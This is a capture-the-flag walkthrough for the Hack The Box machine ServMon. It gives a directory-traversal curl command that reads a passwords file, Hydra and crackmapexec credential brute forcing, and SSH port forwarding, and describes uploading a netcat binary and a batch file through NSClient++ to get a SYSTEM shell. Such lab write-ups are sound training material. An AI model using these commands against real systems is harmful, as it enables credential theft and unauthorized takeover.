## ServMon

Difficulty: Easy

Topics: Open FTP, NVMS, NSClient++, Port Forwarding

https://app.hackthebox.com/machines/ServMon

### User Flag

```
sudo rustscan -a 10.10.10.184 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://user-images.githubusercontent.com/58514930/234736772-f5c1a23e-9df3-49b3-aa86-64afa0e779ed.png)

<br>

Anonymous FTP login is possible.

Possible users: Nadine and Nathan.

![ftp notes](https://user-images.githubusercontent.com/58514930/234736874-ea9dd4b9-a06b-4ea0-a3af-0538994af0f3.png)

<br>

Website uses NVMS - 1000.

![website](https://user-images.githubusercontent.com/58514930/234736930-1967f399-b33c-4993-b9b2-61feb2101049.png)

<br>

Find this [public exploit](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py).

```
curl http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt --path-as-is
```

![gettingPasswords](https://user-images.githubusercontent.com/58514930/234737079-b4a78aef-8cd3-4f02-b199-66f5b257b6d7.png)

Used Hydra to find the correct credentials on SSH, buy could also enumerate on smb with crackmapexec.

```
hydra -l nadine -P password.txt 10.10.10.184 ssh -V
crackmapexec smb 10.10.10.184 -u nadine -p password.txt
```

![hydraSSH](https://user-images.githubusercontent.com/58514930/234737211-b98e82ad-d4b3-44f0-8fcb-409ba587e63a.png)

![smbEnumeration](https://user-images.githubusercontent.com/58514930/234737227-a57d936d-bd0d-4e52-b613-381a948a096f.png)

<br>

Just login into SSH with this credentials and get the user flag.

### Root Flag

Accessing port 8443, NSClient++ 0.5.2.35 is being used.

![port8443](https://user-images.githubusercontent.com/58514930/234896253-91885da8-88c2-43d3-aeb0-2da4583ad67f.png)

<br>

There is a [public exploit](https://www.exploit-db.com/exploits/46802) to this.

Lets follow it, first finding the password.

```
nscp web -- password --display
```

![nsclientPassword](https://user-images.githubusercontent.com/58514930/234896486-62f63899-d999-4be0-9b64-9185b56934e7.png)

<br>

Only IP 127.0.0.1 is allowed to login, so we need to port forward the website to our machine.

```
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

![portForwarding](https://user-images.githubusercontent.com/58514930/234899001-922b4c8d-c737-4ba7-9e98-7e7bc3006aea.png)

<br>

Next, we upload evil.bat and nc.exe to the victim on C:\Temp.

For some reason only specific nc worked, the others was blocked by the system. I used [this one](https://github.com/int0x33/nc.exe/blob/master/nc64.exe).

![uploadingFiles](https://user-images.githubusercontent.com/58514930/234897592-da8736c7-d85b-4c02-ba4a-bc9ec6822e64.png)

<br>

Now we need to create the script in the website.

![scripts](https://user-images.githubusercontent.com/58514930/234897797-69a67c06-dbe3-41c5-b687-c548976aad7b.png)

![savingScript](https://user-images.githubusercontent.com/58514930/234897887-365bc0d6-9e59-4360-b3a1-51c6dabe9c68.png)

<br>

Reaload it and you should get the system shell.

![reload](https://user-images.githubusercontent.com/58514930/234898133-3d8e9a97-95ea-4229-afa2-04fd693ceb9f.png)

![systemShell](https://user-images.githubusercontent.com/58514930/234898295-70dd0f92-f5dd-407e-a269-0d10ade30994.png)
